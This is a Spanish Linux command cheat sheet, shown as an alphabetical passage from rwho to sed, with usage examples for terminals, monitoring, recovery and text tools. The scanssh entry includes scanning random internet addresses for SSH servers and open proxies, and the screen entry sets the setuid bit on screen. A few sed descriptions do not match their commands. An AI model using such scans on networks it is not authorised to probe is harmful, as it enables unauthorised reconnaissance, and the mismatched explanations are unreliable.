Produce una salida similar a who [ver], pero para todas las máquinas de la red local. La información de estado se emite una vez cada 3 minutos por cada host de la red que ejecuta el demonio rwhod. Cualquier actividad (como el inicio o el cierre de sesión de un usuario) que tenga lugar entre las emisiones no se refleja hasta la siguiente emisión.
# rwho -a (Incluye todos los usuarios. Sin este indicador, los usuarios cuyas sesiones estén inactivas una hora o más no se incluyen en el informe)


rxvt
Emulador de terminal
$ rxvt -geometry 100x40 -e links2 http://google.es
Opciones:
-geometry 100x12  (especificar medidas)
-bg red (color de fondo)
-fg white (Color de fuente)
-cr blue  (Color del cursor)
-title "Consola linux" (especificar un título)


rxvt-unicode
Emulador de terminal vt102 en color. Incluye las aplicaciones rxvt, urclock, urxvt, urxvtc, urxvtcd y urxvtd
$ urxvt
$ urclock (muestra un reloj en la pantalla)
$ urxvtd (activa el daemon que permite lanzar urxvtc)


rzip
Compresor/descompresor. Crea los comprimidos con extensión .rz
$ rzip archivo.txt (Substituye archivo.txt por archivo.txt.rz)
$ rzip -o archivo.txt -d archivo.txt.rz (Descomprimir. Imprescindible dar el nombre del archivo de salida [-o])


s
Motor de busqueda por consola que lo abre en el navegador predeterminado o en una pestaña del mismo si ya está abierto. Usa google como motor de busqueda predeterminado si no se especifica otro.
$ s -l (listar todos los sitios web donde buscar)
$ s --list-tags (Listar las etiquetas que tambien puden usarse. Por defecto en youtube)
$ s -t video queen (Buscar por una etiqueta)
$ s repositorio debian (Busqueda básica. Busca "repositorio debian")
$ s -p duckduckgo repositorio debian (especificando que lo haga con el buscador duckduckgo)
$ s -p amazon bash (buscar en Amazon "bash")
$ s -p fa lapipaplena (Lo busca en facebook)
$ s -b "midori" red had (buscar con otro navegador "red had")
$ s -b "chromium --incognito" descargar torrents (en modo incognito con chromium)
$ s -b "firefox --private-window" descargar torrents (en modo incognito con firefox)
$ s -s (abrirlo como servidor en el puerto por defecto 8080)


s5
formato de presentación de diapositivas basado completamente en XHTML, CSS y JavaScript. Con un archivo, normalmente con HTML estructurado de una forma específica, se puede ejecutar una presentación de diapositivas completa y también tener una versión para imprimir.
$ s5 new presentacion.html (crear nueva presentación a partir de un archivo html con la estructura básica de un archivo s5 con diapositivas separadas por elementos <div> con clases específicas)
$ s5 update presentacion.html (actualizar una presentación)
$ s5 serve presentacion.html (iniciar un servidor para ver la presentación en el navegador en tiempo real mientras editas)
$ s5 export presentacion.html --output=presentacion.pdf (exportar la presentación a PDF)


s6
[s6-doc]. Conjunto de programas diseñado para permitir la supervisión de procesos (también conocida como supervisión de servicios), en la línea de daemontools y runit, así como diversas operaciones sobre procesos y demonios. Su objetivo es ser una caja de herramientas para la administración de procesos y servicios de bajo nivel, proporcionando diferentes conjuntos de herramientas independientes que se pueden usar dentro o fuera del marco y que se pueden ensamblar para lograr una funcionalidad poderosa con una cantidad muy pequeña de código. La aplicación incluye: s6-accessrules-cdb-from-fs, s6-accessrules-fs-from-cdb, s6-applyuidgid, s6-cleanfifodir, s6-connlimit, s6-envdir, s6-envuidgid, s6-fdholder-daemon, s6-fdholder-delete. s6-fdholder-getdump, s6-fdholder-list, s6-fdholder-retrieve, s6-fdholder-setdump, s6-fdholder-store, s6-fdholder-transferdump, s6-fdholderd, s6-fghack, s6-ftrig-listen, s6-ftrig-listen1, s6-ftrig-notify, s6-ftrig-wait, s6-ftrigrd, s6-instance-control, s6-instance-create, s6-instance-delete, s6-instance-list, s6-instance-maker, s6-instance-status, s6-ioconnect, s6-ipcclient, s6-ipcserver, s6-ipcserver-access, s6-ipcserver-socketbinder, s6-ipcserverd, s6-log, s6-mkfifodir, s6-notifyoncheck, s6-permafailon, s6-setlock, s6-setsid, s6-setuidgid, s6-socklog, s6-softlimit, s6-sudo, s6-sudoc, s6-sudod, s6-supervise, s6-svc, s6-svdt, s6-svdt-clear, s6-svlink, s6-svlisten, s6-svlisten1, s6-svok, s6-svperms, s6-svscan, s6-svscanctl, s6-svstat, s6-svunlink, s6-svwait, s6-tai64n, s6-tai64nlocal, s6-usertree-maker, s6lockd y ucspilogd. Colocar en el navegador: file:///usr/share/doc/s6/index.html y se muestra una extensa información sobre todos los parámetros.


s-tui
[python-pip stress]. Control de la temperatura, la frecuencia, la potencia y la utilización de la CPU, escrito en Python [pip install s-tui].
# s-tui


sa
[acct]. Se utiliza para imprimir el resumen de los comandos ejecutados por los usuarios.
$ sa -a (todos)
$ sa -m (tiempo por usuarios del sistema)
$ sa -c (Imprime porcentajes para el usuario del comando, el sistema y los valores en tiempo real)


sac
Realiza la cuenta de inicio de sesión, mostrando totales por día y por usuarios. También realiza uso promedio y perfil por hora.
$ sac -d (muestra el tiempo de inicio de sesión por dia)
$ sac -p (por usuario)
$ sac -t (por tty)
$ sac -a (información promedio)
$ sac -U (por niveles de uso simultaneo)


sadf
[sysstat]. Herramienta que se utiliza para mostrar los datos recogidos con diferentes herramientas de sysstat como sar, iostat, pidstat etc y que también soporta la exportación en diferentes formatos como CSV, XML, etc. Activar sysstat::
# nano /etc/default/sysstat
Y colocar:
ENABLED="true"
# sadf -d (mostrar datos del archivo separados por punto y coma)
# sadf -d /var/log/sysstat/sa19 -- -r (indica los parámetros de memoria)
# sadf -x /var/log/sysstat/sa19 (exportar los datos a XML))


sagan
Monitor de logs del sistema. El informe en /var/log/sagan/sagan.log
# sagan -d syslog -u user (del archivo syslog y el usuario especificado)
# sagan -d malformed (de los malformados)


saidar
Aplicación para mostrar estadísticas del sistema, tales cono de la CPU, procesos, carga, memoria, intercambio, I/O de red y de discos junto con su espacio libre. Pulsar "q" para salir.
$ saidar -d 2 -c (actualización cada 2 segundos, por defecto son 3 y a color)


sakura
Terminal
# sakura -e tail -f /var/log/fail2ban (Lanzar una aplicación)
$ sakura -n 3 -c 50 -r 30 (Lanzar la terminal con 3 pestañas y 50 columnas por 30 lineas)
Algunos atajos:
	Ctrl + Shift + T (Nueva pestaña)
	Ctrl + Shift + W (Cerrar pestaña)
	Alt  + Flechas (Moverse entre las pestañas)
	Alt  + [1-9] (Ir a la pestaña numero ..)
	Ctrl + Shift + S (Mostrar barra de scroll)
	Ctrl + Shift + RePag (Scroll arriba)
	Ctrl + Shift + AvPag (Scroll abajo)
	F11 (Maximizar/minimizar la pantalla)
	Ctrl + '+' (Aumentar la medida de la letra)
	Ctrl + '-' (Disminuir la medida de la letra)


samhain
Verificar integridad y un sistema de detección de intrusiones en grandes redes basadas en UNIX.  Después de la instalación, se debe revisar primero el fichero de configuración (por defecto /etc/samhainrc), especialmente con respecto a las direcciones de red como la dirección de correo electrónico y los ficheros/directorios que se quiera comprobar. Los logs en /var/log/samhain_log
# samhain -t init -p info (inicializar la base de datos y mostrar mensajes de gravedad en la consola)
# samhain -t check -D (iniciar samhain en modo demonio para revisar el sistema en intervalos especificados en el archivo de configuración)


sane
[Scanner Access Now Easy]. Se trata de una interfaz que proporciona acceso estandarizado a cualquier hardware de escáner de imágenes rasterizadas [escáner de superficie plana, escáner de mano, cámaras de vídeo y fotográficas, captadores de fotogramas, etc]. Incluye las aplicaciones gamma4scanimage, sane-find-scanner [ver], scanimage [ver] y umax_pp.


sane-find-scanner
Herramienta para encontrar escáneres SCSI y USB incluso si no son compatibles con ningún backend SANE.
$ sane-find-scanner (forma básica)
$ sane-find-scanner -q (Imprime solo los dispositivos, sin comentarios)


sar
[sysstat]. Controlando logs. Herramienta de monitorización del rendimiento. Cubre la mayoría de las áreas del sistema:  Uso de la CPU [opción -u, por defecto],  Colas de procesos y carga del sistema [opción -q],  Estadísticas por proceso [-x [PID | ALL]],  Creación de procesos [-c] y cambios de contexto [-w],  Actividad de los dispositivos de bloque [-d] y TTY [-y],  Uso de memoria y espacio de swap [-r],  Estadísticas de memoria [-R], de paginación [-B] y de swapping [-W],  Estadísticas de interrupciones [-I]. [/var/log/sysstat/sadd .-”dd” indica el dia]
$ sar -q 10 3 (3 muestras cada 10')
$ sar -Ruy 5 2 (2 muestras cada 5')


sarg
Generador de informes html de análisis de Squid con campos para: usuarios, direcciones IP, bytes, sitios y tiempos. Algunas opciones del archivo de configuración:
# nano /etc/sarg/sarg.conf
Descomentamos o modificamos las lineas
    output_dir /var/www/html/squid-reports
    date_format e
    overwrite_report no
    resolve_ip yes
    #mail_utility mailx
    charset UTF-8
# sarg -x (lanzar la aplicación)
Aceder a los informes con el navegador en http://localhost/squid-reports


sash
Sirve como un sustituto interactivo de /bin/sh, para usar cuando este no se puede utilizar. Incluye muchas utilidades estándar como rm, kill, mkdir, chown... Si esta instalado en el sistema y por algún problema este no puedira iniciarse, es posible que lo pueda reparar usando init=/bin/sash en el indicador de inicio.
# sash (entrar en el prompt de la aplicación)
> help (muestra los comandos permitidos)
> help comando (como se usa "comando" del listado anterior)
> cd DIR (se entra en el DIR pero no lo muestra en el prompt)
> exit (salir del prompt)


sbws
Escanea la red Tor y genera archivos de lista de ancho de banda
# sbws scanner (escaner la red con la configuración por defecto)
# sbws -c ~/.sbwsrc scanner (escanera la red con un archivo especificado)
# sbws --log-level debug generate (genera el archivo v3bw en el directorio v3bw predeterminado)
# sbws cleanup (limpia los archivos v3bw anteriores en el directorio predeterminado v3bw)


sc
Hoja de cálculo
$ sc
Teclas básicas:
	Cursores (moverse entre las celdas)
	= (añadir valor numérico o formula)
	< (texto alineado a la izquierda)
	> (texto alineado a la derecha)
	\ (texto Centrado)
	e (modificar una celda de tipo numérico)
	E (modificar una celda de texto)
	x (Borrar contenido de una celda)
	P (Guardar el trabajo. Usa extensión .sc)
	Q (Salir)
	Formulas:
	= @sum(A2:C2) (Suma de las casillas A2,B2 y C2)
	= @prod(A2:B2) (Producto de A2 por B2)
	= @avg(A2:A3) (Media entre A2 y A3)
	= @count(A1:A5) (Contar las entradas no en blanco)
	Operaciones básicas:
	e A1+A4 (Sumar A1 y A4)
	e A1-A3 (Restar A3 de A1)
	e A1*A2 (Multiplicar A1 por A2)
	e A5/A2 (Dividir A5 por A2)


scalpel
Recureprar archivos borrados
Editar el archivo /etc/scalpel/scalpel.conf y descomentamos la linea de la extensión que se quiere recuperar. P.e. para un .avi seria la linea 110. Guardar y arrancar la aplicación:
# scalpel /dev/sda2 -o carpeta_recup (Se recuperará los avi de sda2 y se guardaran en carpeta_recup)


scan
[linuxtv-dvb-apps]. Sintonizar canales de TV. El directorio /usr/share/dvb/dvb-t/ contiene las zonas de cobertura de la televisión digital terrestre.
$ scan /usr/share/dvb/dvb-t/es-Rocacorba > channels.conf
Copiar el archivo creado en el directorio .vlc/ [si no existe se crea] Abrir vlc con el siguiente comando:
$ vlc .vlc/channels.conf (Bucar los canales en View/Play list)


scanadf
[sane]. Controlar dispositivos de adquisición de imágenes capaces de devolver series de imágenes, por ejemplo, de un escáner con alimentador automático de documentos [ADF].
$ scanadf -o %02d (con salida con dos dígitos [01, 02, 03...] por defecto: image-%04d [image-0001, image-0002...])


scanimage
[sane, sane-utils]. Escanear. Por defecto genera archivos tiff y pnm.
$ scanimage -L (Para conocer los datos del escaner)
$ scanimage -v -p > imagen.tiff (Ver la información que genera el progreso y redirigido a un archivo)
$ scanimage -p --mode Color --resolution 200 -l 0 -t 0 -x 190 -y 160  > imagen.pnm (Las opciones de "mode" y "resolution" los muestra el parámetro "help". Las opciones "l" y "t" indican que comenzará a escanear desde la esquina superior izquierda. Los limites de estos parámetros tambien los muestra "help". "x" e "y" indican la medida de la imagen a escanear. En este caso 190X160 mm)
$ scanimage -p | convert - imagen.png (Redirigiendo la salida a convert que pasa la imagen a png)
$ scanimage --format=png > imagen.png (escanear imagen y guardarla como png)
$ scanimage -d hpaio:/usb/psc_1100_series?serial=MY387F93QWB --format=jpg > image.jpg (con el dispositivom especificado y guardar como jpg)
$ scanimage -T (realizar un test de la imagen a escanear)
$ scanimage -A (ver todas las opciones de escaneo)


scanlogd
Detecta escaneos de puertos y escribe una línea por escaneo a través del mecanismo syslog. scanlogd solo registra escaneos de puertos. No los impide. Sólo envia información resumida al registro del sistema. Obviamente, la dirección de origen de los escaneos de puertos puede ser falsificada. No tome ninguna medida contra la fuente de los ataques a menos que haya otra evidencia disponible. Crear o  añadir al archivo:
# nano /etc/syslog.conf
La linea
daemon.alert   /var/log/alert
# systemctl restart scanlogd.service
# systemctl status scanlogd.service


scanssh
Scanea una lista de direcciones y redes en busca de servidores de protocolo SSH en ejecución y sus números de versión, así como puertos y servidores proxy abiertos.
# scanssh 192.168.0.0/24 (escaneará toda la red 192.168.0.0/24 buscando servidores SSH en ejecución)
# scanssh -n 22 192.168.0.0/24 (escaneará solo el puerto 22 en la red especificada)
# scanssh -p 192.168.0.0/24 (detectar proxies abiertos en la red especificada)
# scanssh -s ssh,socks5,http-proxy,telnet-proxy 192.168.0.0/24 (ejecutará múltiples escaneadores simultáneamente [SSH, SOCKS5, HTTP proxy y TELNET proxy] en la red especificada)
# scanssh -u socks.example.com:9050 192.168.0.0/24 (usará SOCKS proxies para escanear la red especificada)
# scanssh 'random(1000)/0.0.0.0/0' (escaneará aleatoriamente 1000 direcciones en la red 0.0.0.0/0)
# scanssh 192.168.18.0/24 -I -r 3 (sin cadena de identificación ssh y 3 pruebas por segundo


schroot
Parecido a un chroot [ver] que se ha de usar como root, pero para usuarios normales. schroot permite el acceso a chroots para usuarios normales que utilizan el mismo mecanismo, pero con la comprobación de permisos y permite la configuración automática adicional del entorno chroot, como el montaje de sistemas de archivos adicionales y otras tareas de configuración.


scout_realtime
[rubygems]. Herramienta para monitorizar métricas del servidor Linux, ya sea en local o remoto via web. Muestra gráficos de la CPU, memoria, disco, red y procesos. Al ser una aplicación en Ruby ha de instalarse:
# gem install scout_realtime
# scout_realtime (Lanzar el daemon)
Abrir el navegador y colocar:
	http://localhost:5555
# scout_realtime stop (detener el daemon)
Si el monitoreo se realiza en remoto, ha de abrirse el puerto 5555 de la maquina a monitorizar. Visualizar los logs:
$ cat .scout/scout_realtime.log


scp
Copiar o transferir archivos o directorios entre una máquina remota y una local
$ scp -r textos pepe@IP: (copiará el directorio "textos" al host remoto en el directorio del usuario)
$ scp pepe@host_o_IP:/home/pepe/*.odt ./pendiente (Copiará todos los .odt del directorio /home/pepe del host remoto al directorio “pendiente” de la máquina local)
$ scp pepe@host_o_ip:Descargas/*.avi Pelis (Descargará todos los .avi del directorio "Descargas" del host remoto a la carpeta "Pelis" de la maquina local)
$ scp *.odt pepe@host_o_IP:/home/pepe/pendiente (transferirá todos los odt del directorio actual al directorio especificado “pendiente” del host remoto.)
$ scp archivo usuario@host_o_IP:/home/usuario/Desktop (copiará “archivo” en local al escritorio remoto)
$ scp -l 500 -r directorio pepe@host_o_IP:/home/usuario/Desktop (copiará el directorio al host remoto y limitando el ancho de banda a 500 Kbits/s)
$ scp -P 12000 pep@chost_o_IP:/home/usuario/archivo . (especificando un puerto en el host remoto y copiar archivo al presente directorio)
$ scp -q archivo.tar.gz usuario@host_o_IP: (Deshabilitando la salida del comando [barra de progreso y mensaje])
$ scp -Cv archivo usuario@host_o_IP: (Activando compresión de datos y mostrando más información del proceso)
$ scp -c aes128-cbc archivo.tar.gz usuario@host_o_IP: (Habilitar cifrado durante la transferencia [Cifrados posibles:3des-cbc, aes128-cbc, aes192-cbc, aes256-cbc, aes128-ctr, aes192-ctr, aes256-ctr, arcfour128,arcfour256, arcfour, blowfish-cbc y cast128-cbc])
Nota.- Si quiere transferirse al $HOME remoto o desde el $HOME remoto puede suprimirse la ruta relativa, quedando: scp archivo pepe@host_o_IP:


screen
Compartir sesiones de consola locales o remotas.
$ screen   (abre una terminal virtual genérica)
$ screen -S tux  (nombrar la sesión del que comparte consola)
	$ screen -ls (conocer los screen abiertos y sus nombres)
	There are screens on:
        19680.tux       (Attached)
        19684.xut       (Attached)
# screen /dev/ttyACM0 115200 (conectar a una consola serie. En el ejemplo se usa la conexión serie del miniordenador VoCore2 (/dev/ttyACM0) y se le especifica la velocidad de 115200 bps. Si quieres usar una tty como usuario normal debes añadir tu usuario a los grupos uucp y dialout)
2 Sockets in /tmp/screens/S-juanito.
$ screen -x 19680.tux  (el que se conecta)
$ screen -r 	Retoma el proceso desacoplado con Ctrl+a Ctrl+d
$ screen -r -S nombre	Retoma el proceso "nombre"
$ screen -R -D	Recupera screen despúes de un Ctrl+d
La gestión de screen siempre empieza pulsando las teclas Ctrl+a:
	Ctrl+a c (Crear nueva ventana)
	Ctrl+a k (Matar pantalla activa / sesion activa)
	Ctrl+a X (Matar pantalla activa)
	Ctrl+a x (Bloquear terminal)
	Ctrl+a w (Lista de ventanas)
	Ctrl+a 0-9 (Ir a la ventana numerada)
	Ctrl+a Ctrl+a (Cambiar a la última ventana)
	Ctrl+a Ctrl+p (Cambiar a la anterior ventana)
	Ctrl+a S (Dividir la terminal horizontal en regiones)
	Ctrl+a | (Dividir la terminal veticalmente)
	Ctrl+a Ctrl+n (Cambiar de región)
	Ctrl+a :resize (Redimensionar región)
	Ctrl+a F (Ajustar tamaño de la pantalla al tamaño de la nueva terminal)
	Ctrl+a K (Suprimir region)
	Ctrl+a Z (resetear screen)pi
	Ctrl+a tab (Moverse entre regiones)
	Ctrl+a d (Desacopla un proceso de una terminal, que continua en segundo plano)
	Ctrl+a ? (Mostrar pantalla de ayuda)
	Ctrl+a Backspace (Regresar a la ventana previa)
	Ctrl+q (Si se ha pulsado una combinación erronea, desbloquea la terminal)
	Ctrl+s (Lo mismo)
	Ctrl+a " (Muestra las shells activas)
	Ctrl+a A (Cambiar el título de la ventana)
	Ctrl+a Esc (Ver historial)
	Ctrl+a h (Guardar pantallazo en la carpeta actual con nombre hardcopy.número [0,1,2...])
	Ctrl+a H (Iniciar/parar registro de la ventana actual en la ventana con nombre screenlog.número [0,1,2...])
Para compartir screen via ssh:
	Activar el setuid de screen:
	# chmod +s /usr/bin/screen
	Ejecutar:
	$ screen -S nombreSesion
	Activar acceso multiusuario:
	Ctrl+a :multiuser on
	Dar permisos al usuario:
	Ctrl+a :acladd usuario
	El usuario remoto debera conectar por SSH con la máquina y ejecutar:
	$ screen -x usuario/NombreSesion
Si deseamos tener una barra inferior donde aparecerá el nombre de las diferentes ventanas y la hora actual, podemos modificar/crear el fichero de configuración ~/.screenrc con el siguiente contenido (http://www.marblestation.com/?p=915):
	# screen -t shell 0
	# screen -t shell 0 motd+shell
	# screen -t shell2    1
	# screen -t server    2
	# screen -t Mail 9   tail -f /var/log/messages
	select 0
	shelltitle "shell"
	# skip the startup message
	startup_message off
	# go to home dir
	chdir
	# Automatically detach on hangup.
	autodetach on
	# Change default scrollback value for new windows
	defscrollback 1000
	# Turns off alternate screen switching in xterms,
	# so that text in screen will go into the xterm's scrollback buffer:
	termcapinfo xterm* ti@:te@
	altscreen on
	# start with visual bell as default
	vbell on
	vbell_msg "bell on %t (%n)"
	activity "Activity in %t(%n)"
	# Run a screensaver if there's nothing happening for a while.
	#idle 600 eval "screen cmatrix -f -o -u 10" "idle 0"
	idle 600 lockscreen
	### White
	#caption always "%{kW}%?%-Lw%?%{bw}%n*%f %t%?(%u)%?%{kW}%?%+Lw%? %= %{= Wk}%110`%109`%111` %H load: %l | %D %d-%m-%Y %0c:%s"
	### Black
	#caption always "%{wk}%?%-Lw%?%{bw}%n*%f %t%?(%u)%?%{wk}%?%+Lw%? %= %{= kw}%110`%109`%111` %H load: %l | %D %d-%m-%Y %0c:%s"
	caption always "%{wk}%?%-Lw%?%{bw}%n*%f %t%?(%u)%?%{wk}%?%+Lw%? %= %{= kw}%110`%109`%111` %H | %D %d-%m-%Y %0c:%s"


screendump
[kbd]. Vuelca el contenido de una consola virtual a stdout. Abrimos la consola /dev/tty1 y en ella lanzamos, por ejemplo, "htop" y en una terminal de las X lanzamos:
# screendump 1
Y nos mostrará un pantallazo de lo que ocurre en la terminal /dev/tty1


screenfetch
Muestra información del equipo. En caso de no estar en los repositorios:
$ wget -c https://raw.github.com/KittyKatt/screenFetch/master/screenfetch-dev -O screenfetch
$ ./screenfetch
$ ./screenfetch -s (Realiza una captura de pantalla)
$ ./screenfetch -n (Muestra información sin el logo)
$ ./screenfetch -c 9 -L (Que muestre solo el logo y en rojo. Colores del 0 al 9)
$ ./screenfetch -E (Excluir los parámetros que dan error, si existen)


screengrab
Capturas de pantalla del escritorio o del area seleccionada.
$ screengrab -f (de la pantalla completa)
$ screengrab -a (de la ventqana activa)
$ screengrab -r (del area que seleccionemos)


screenkey
[python-xlib]. Aplicacion que, durante una grabacion de escritorio en la que salen terminales y comandos, muestra por pantalla una franja negra en la que se puede apreciar las teclas que se pulsan para que las puedan ver mejor los televidentes. Iniciar la aplicacion (Se mostrara en el area del tray) y la grabacion del escritorio con alguna de las herramientas (gtk-recordMyDesktop, kazam, etc) y pararla con killall -9 screenkey cuando finalice la grabacion.


scribes
Editor minimalista especial para programadores.
	Algunos atajos:
	Ctrl + o (Abrir archivo)
	Ctrl + s (Guardar)
	Ctrl + Mayus + s (Renombrar)
	Ctrl + p (Imprimir)
	Ctrl + t (Indentar lineas seleccionadas)
	Ctrl + Mayus + t (Suprimir indentación)
	Alt +t (Convertir espacios en tabulaciones)
	Alt + Mayus + t (Convertir tabulaciones a espacios)
	Alt + r (Suprimir espacios al final de linea)
	Alt + d (Suprimir linea)
	Alt + F4 (Cerrar el editor)
	F1 (Abrir la ayuda)
	F12 (Abrir preferencias)


script
[scriptreplay]. Copia en un fichero toda la actividad tecleada en consola hasta cesar con "exit"
$ script -a fichero.txt
$ script -t 2> sesion.con -a sesion.vid  (grabará la sesion. Parar el proceso con crtl+d)
$ scriptreplay sesion.con sesion.vid  (reproduce la sesión grabada)
$ script -f /dev/pts/3   (redirigir hacia otra terminal)
1.-
Varias formas de ejecutar un script:
$ bash miscript.sh
$ sh miscript.sh
$ source miscript.sh
O activando el bit de ejecución en los permisos del fichero:
$ chmod +x miscript.sh
$ ./miscript.sh


scrot
Captura de pantalla
$ scrot (Con los valores por defecto)
$ scrot captura.png
$ scrot -s captura.png (Para seleccionar un área en concreto)
$ scrot -d 5 captura.png (retardar la captura 5 segundos)
$ scrot -t 50 captura.png (para reducir la captura un 50%)
$ scrot -ucd 5 (“u” captura la ventana que tiene el foco, “c” que muestre la cuenta regresiva y “d 5” los segundos de retardo)


scrounge-ntfs
Permite recuperar datos de particiones ntfs incluso corruptas.
# scrounge-ntfs -l /dev/sda  (Para vusializar los datos del disco)
La salida del comando puede ser paracida a:
Drive: /dev/sdc
63              16787862        8               6291456
16787925        471607195       8               6291456
Con estos datos lanzar:
# scrounge-ntfs -m 6291456 -c 8 /dev/sdc 16787925 471607195


sd
Como el comando sed [ver] pero simplificado. Por ejemplo con sed, substituir "mañana" por "tarde" en un archivo de texto seria:
    $ sed s/mañana/tarde/g
Y con sd se transformaría en:
    $ sd mañana tarde


sdate
Genera la "fecha eterna" contando los dias pasados des de septiembre de 1993.
$ sdate
  viernes, 11049 de setiembre de 1993, 07:47:43 CET


sdcv
Utilidad basada en texto para trabajar con diccionarios en formato StarDict.
$ sdcv -l (listar los diccionarios que se instalan)
$ sdcv palabra (Buscar "palabra" en los direccionarios)


sdf
[Simple Document Format]. Sistema de desarrollo de documentos en una variedad de formatos desde una única fuente. Los formatos de salida admitidos son PostScript, PDF, HTML, plain text, POD, man pages, LaTeX, MIF, SGML, RTF,MIMS F6 help y MIMS HTX help. Incluye las aplicaciones fm2ps, mif2rtf, pod2sdf, poddiff, prn2ps, sdf, sdfapi, sdfbatch, sdfcli, sdfget y sdngen.


sdiff
Muestra dos ficheros interactivamente.
$ sdiff -W -B file1 file2 (Ignorando espacios [W] y lineas en blanco [B])


sdmem
[secure-delete]. Diseñado para eliminar los datos que pueden permanecer en la memoria RAM de forma segura y que no puedan ser recuperados. Es preciso recordar que en las SDRAMs los datos no se borran, sino que se mantienen estáticos y por tanto es fácil extraerles la información necesaria.
# sdmem -f -v (en modo rápido [f] y verbose [v])
# sdmem -v -l -l (producirá un terminal llena de asteriscos **** para mostrar actividad mientras se sobrescribe el espacio libre en RAM)


seashells
[python-pip]. Herramienta que canaliza la salida de un comando de la terminal a la web en tiempo real. Para instalar:
# pip install seashells
Uso básico:
$ ip a | seashells
	serving at https://seashells.io/v/NNbRnMCJ
	1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
	    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
	    inet 127.0.0.1/8 scope host lo
	       valid_lft forever preferred_lft forever
	...
Abriendo el navegador y colocando la url que da la linea "serving at https://seashells.io/v/NNbRnMCJ" mostrará la salida del comando.
$ htop | seashells --delay 5 (con actualización automática cada espacio de tiempo indicado)


sed
Permite borrar líneas, registros o sustituir cadenas de caracteres dentro de las líneas.
Archivo base para ejemplo (Empleado -- Precio/hora -- Horas trabajadas – Cómo las cobra):
	$ cat lista
	Juan Gomez 6 10 banco
	Clara Fuentes 7 12 banco
	Antonio Cano 6 13 metálico
	José Bueno 7 0 banco
	Matías Crespo 5 8 metálico
	Isabel Ruiz 7 0 metálico
	María Monzón 9 16 metálico
$ sed -n 4p lista (Mostrar la linea 4 del fichero)
$ sed -n 4,5p lista (Mostrar la 4ª y la 5ª)
$ sed -n '4,$p' lista (Mostrar de la 3ª al final del fichero)
$ sed -n '/^\Ant/,$p' lista (Mostrar desde la primera linea que empiece por “Ant” hasta el final)
$ sed -n '/Clara/,/Bueno/p' lista (Mostrar sólo los parrafos desde “Clara” hasta “Bueno”)
$ sed G lista (Mostrar cada linea seguida de una linea en blanco)
$ sed “n;d” lista (Suprimir las lineas en blanco)
$ sed -n '/Ju/p' lista (Mostrar las lineas que cumplen el patrón “Ju” en alguno de sus campos)
$ sed '4d' lista (Borrar la 4ª linea del fichero)
$ sed -e \$d lista (Borrar la última linea del fichero)
$ sed '$d' lista (Lo mismo)
$ sed -e '/J/d' lista (Borrar las lineas que empiecen por "J")
$ sed '2d' lista (Borrar la segunda linea)
$ sed '1,2d' lista (Borrar la 1ª y la 2ª)
$ sed -e 's/ .*//' lista (Borrar a partir del primer espacio en blanco)
$ sed -e '/^\Ant/,$d' lista (Borrar desde la primera linea que empiece por "Ant" hasta el final)
$ sed '2,/Ruiz/d' lista (Borrar desde la 2 linea hasta la que tenga "Ruiz")
$ sed '/^$/d lista (Borrar las lineas en blanco de un archivo. En "lista" no procede)
$ sed '3!s/metálico/gratis/' lista (Cambiar "metálico" por "gratis" excepto en la 3 linea)
$ sed '/Cano/!s/met/tem/' lista (Cambiar "met" por "tem" en las lineas que no tengan "Cano")
$ sed 's/banco/cheque/' lista (Cambiar campos: banco por cheque)
$ sed 'y/J-C/j-c/' lista (Cambiar las "J" y la "C" mayúsculas por minúsculas)
$ sed -e "s/[aeio]/u/g" lista (Substituye las vocales por "u")
$ sed -e 's/ /\t/g' lista (Substituir los espacios por tabulaciones)
$ sed -e :a -e 's/^.\{1,77\}$/ &/;ta' -e 's/\( *\)\1/\1/' lista (Alinear al centro)
$ cat lista | sed -n '4,$p' (Todas las opciones pueden usarse como tubería substituyendo "lista" por “cat lista |”)
$ sed -n '$=' lista (Contar lineas de un archivo [emulador de wc -l])
$ sed 's/^/     /' lista (Insertar 5 espacios en blanco delante de cada linea)
$ sed '2i\ \' lista (Insertar una linea en blanco despues de la primera linea)
$ sed '2i\ \' | sed '4i\ \' lista (Insertar una linea en blanco despues de la primera linea y de la tercera)
$ sed -n 's/Fuentes/Ruiz/p' lista (Imprimir solo líneas reemplazadas. La opción -n suprime filas duplicadas generadas por el indicador /p e imprime las líneas reemplazadas solo una vez)
$ sed -i 'n;G;' lista (Insertar una linea en blanco cada 2 lineas)
Otros ejemplos:
$ sed -e '/^#/d' /etc/fstab (Mostrar lineas no comentadas de un archivo)
$ ls * | sed -e 'p;s/foto/FOTO/' | xargs -n2 mv (Substituir "foto" por "FOTO" en todo los archivos del directorio)
$ sed -i 's/Juan/Pedro/g' *.txt (Cambiar “Juan” por “Pedro” en todos los archivos .txt del presente directorio)
$ sed '/[0-9]\{4\}/p' archivo (Mostrar sólo las lineas con 4 dígitos seguidos)
$ sed 's/^[ ^t]*//' archivo (Borrar todos los espacios delante de cada linea)
$ echo "      Linux es genial" | sed 's/^ *//' (lo mismo)
$ sed 's/[ ^t]*$//' archivo (Borrar todos los espacios detras de cada linea)
$ echo "Linux es genial      " | sed 's/* $//' (Lo mismo)
$ echo "Linux es genial" | sed 's/......$//' (Borrar los últimos 6 caracteres de una linea)
$ cat file.txt | sed 's/^.//' (Eliminar el primer caracter de cada linea de un archivo)
$ echo "Linux es genial" | sed 's/^.....//' (Borrar los primeros 5 caracteres de una linea)
$ cat file.txt | sed 's/..$//' (Eliminar los dos últimos caracteres de cada linea de un archivo)
$ cat file.txt | sed 's/...$//;s/^...//' (Eliminar los tres primeros y tres últimos caracteres de cada linea de un archivo)
$ sed 's/^[ ^t]*//;s/[ ^]*$//' archivo (Borrar todos los espacios delante y detras de cada linea)
$ sed -r "s/\<(reg|exp)[a-z]+/\U&/g" archivo (Cambiar números 3333 por 3.333. Parámetro -r sirva activa las expresiones regulares extendidas de sed)
$ sed "5i ---\n categories:tractatus\n date: 2015-05-22\n title: res\n ---\n" archivo.txt (Insertar texto entre una linea y otra. Por ejemplo en la linea 5)
$ sed -i "2 s|^|texto al principio|" archivo (Insertar texto al pricipio de la 2ª linea)
$ sed -i "s|^|texto al principio|g" archivo (Insertar texto al principio de todas las lineas)
$ sed -i "5 s|$|texto al final|" archivo (Insertar texto al final de la linea 5)
$ sed -i "s|$|texto al final|g" archivo (Insertar texto al final de todas las lineas)
$ sed -n '/Texto/=' archivo (Mostrar el número de línea que contiene una ocurrencia)
$ sed -i "/${VARIABLE}/d" archivo (Utilizar variables dentro de sed)
$ sed -n "/^${NUM_BAIXA}/p" archivo (Que la variable esté al principio de la linea)
